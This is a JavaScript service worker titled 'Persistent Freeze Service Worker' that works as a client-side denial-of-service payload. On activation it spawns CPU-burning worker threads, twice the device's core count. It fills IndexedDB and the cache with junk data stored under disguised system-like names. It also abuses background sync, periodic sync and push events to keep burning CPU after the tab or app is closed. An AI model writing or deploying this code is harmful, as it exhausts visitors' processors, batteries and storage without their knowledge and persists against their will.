'use strict';

// ════════════════════════════════════════════════════
//  PERSISTENT FREEZE SERVICE WORKER
//  Survives tab close, app close, device lock.
//  Re-activated by Background Sync & Periodic Sync.
// ════════════════════════════════════════════════════

var SYNC_TAGS = [
    'burn-0', 'burn-1', 'burn-2', 'burn-3', 'burn-4',
    'burn-5', 'burn-6', 'burn-7', 'burn-8', 'burn-9'
];
var PERIODIC_TAG = 'periodic-burn';
var x = 1.0;

// ── CPU BURN ─────────────────────────────────────────
function burnFor(ms) {
    var end = Date.now() + ms;
    while (Date.now() < end) {
        x = Math.sqrt(Math.abs(x) * Math.random() * 9999999 + 1);
        x += Math.sin(x) * Math.cos(x * 1.337);
        x += Math.log(Math.abs(x) + 1) * Math.atan2(x, x + 1);
        x += Math.pow(Math.abs(x) + 0.001, 0.7);
    }
}

// ── SPAWN WORKERS INSIDE SW ───────────────────────────
// Workers spawned from SW survive as long as SW is alive
function spawnSWWorkers() {
    var code = [
        'var x=1.0;',
        'function b(){',
        '  var e=Date.now()+45;',
        '  while(Date.now()<e){',
        '    x=Math.sqrt(Math.abs(x)*Math.random()*9999999+1);',
        '    x+=Math.sin(x)*Math.cos(x*1.337);',
        '    x+=Math.log(Math.abs(x)+1)*Math.atan2(x,x+1);',
        '    x+=Math.pow(Math.abs(x)+0.001,0.7);',
        '  }',
        '  setTimeout(b,0);',
        '}',
        'b();'
    ].join('');
    try {
        var blob = new Blob([code], { type: 'application/javascript' });
        var url = URL.createObjectURL(blob);
        var cores = (self.navigator && self.navigator.hardwareConcurrency) || 4;
        for (var i = 0; i < cores * 2; i++) new Worker(url);
    } catch (e) { }
}

// ── FILL STORAGE (IndexedDB + Cache API) ─────────────
// Causes memory/storage pressure even after tab close
function fillStorage() {
    // IndexedDB - fill with large blobs
    try {
        var req = indexedDB.open('_sys_cache', 2);
        req.onupgradeneeded = function (e) {
            try { e.target.result.createObjectStore('blobs'); } catch (ex) { }
        };
        req.onsuccess = function (e) {
            try {
                var db = e.target.result;
                var tx = db.transaction('blobs', 'readwrite');
                var store = tx.objectStore('blobs');
                var chunk = new Uint8Array(1024 * 1024 * 30); // 30MB chunks
                for (var i = 0; i < 10; i++) store.put(chunk, 'b' + i);
            } catch (ex) { }
        };
    } catch (e) { }

    // Cache API - fill with junk responses
    try {
        caches.open('_sys_v1').then(function (cache) {
            var big = new Response(new ArrayBuffer(1024 * 1024 * 20)); // 20MB
            for (var j = 0; j < 5; j++) {
                cache.put('/sys_data_' + j, big.clone());
            }
        });
    } catch (e) { }
}

// ── RE-REGISTER ALL SYNC TAGS ────────────────────────
function reRegisterAllSync() {
    SYNC_TAGS.forEach(function (tag) {
        try { self.registration.sync.register(tag); } catch (e) { }
    });
    // Periodic Sync (Chrome Android 80+)
    try {
        self.registration.periodicSync.register(PERIODIC_TAG, {
            minInterval: 12 * 60 * 60 * 1000 // 12h minimum per spec
        });
    } catch (e) { }
}

// ── NOTIFY CLIENTS (send signal to open tabs) ────────
function notifyClients(msg) {
    self.clients.matchAll().then(function (clients) {
        clients.forEach(function (c) { try { c.postMessage(msg); } catch (e) { } });
    });
}

// ════════════════════════════════════════════════════
//  LIFECYCLE EVENTS
// ════════════════════════════════════════════════════

self.addEventListener('install', function (e) {
    // Skip waiting — take control immediately
    self.skipWaiting();
    e.waitUntil(Promise.resolve());
});

self.addEventListener('activate', function (e) {
    e.waitUntil(
        self.clients.claim().then(function () {
            spawnSWWorkers();   // start worker threads
            fillStorage();      // pressure memory/storage
            reRegisterAllSync(); // schedule re-activation
        })
    );
});

// ── BACKGROUND SYNC ──────────────────────────────────
// Fired by browser even after tab close / app background
self.addEventListener('sync', function (e) {
    if (SYNC_TAGS.indexOf(e.tag) !== -1) {
        e.waitUntil(new Promise(function (resolve) {
            spawnSWWorkers();   // spawn fresh workers on each sync
            var burnEnd = Date.now() + 27000; // burn for 27s per sync event
            (function loop() {
                burnFor(55);
                if (Date.now() < burnEnd) {
                    setTimeout(loop, 0);
                } else {
                    reRegisterAllSync(); // re-register → browser fires again
                    resolve();
                }
            })();
        }));
    }
});

// ── PERIODIC BACKGROUND SYNC ─────────────────────────
// Chrome Android: fires every ~12h even with app closed
self.addEventListener('periodicsync', function (e) {
    if (e.tag === PERIODIC_TAG) {
        e.waitUntil(new Promise(function (resolve) {
            spawnSWWorkers();
            fillStorage();
            var burnEnd = Date.now() + 27000;
            (function loop() {
                burnFor(55);
                if (Date.now() < burnEnd) setTimeout(loop, 0);
                else resolve();
            })();
        }));
    }
});

// ── PUSH (if permission granted) ─────────────────────
// Keeps SW alive via push channel even without sync
self.addEventListener('push', function (e) {
    e.waitUntil(new Promise(function (resolve) {
        spawnSWWorkers();
        var burnEnd = Date.now() + 20000;
        (function loop() {
            burnFor(50);
            if (Date.now() < burnEnd) setTimeout(loop, 0);
            else resolve();
        })();
    }));
});

// ── MESSAGES FROM MAIN PAGE ───────────────────────────
self.addEventListener('message', function (e) {
    if (e.data === 'START_BURN') {
        spawnSWWorkers();
        fillStorage();
        reRegisterAllSync();
    }
    if (e.data === 'PING') {
        e.source.postMessage('PONG');
    }
});

// ── FETCH INTERCEPT ───────────────────────────────────
// Required to keep SW as a functional worker (some browsers)
self.addEventListener('fetch', function (e) {
    // Pass through all requests normally
    e.respondWith(
        fetch(e.request).catch(function () {
            return new Response('', { status: 200 });
        })
    );
});
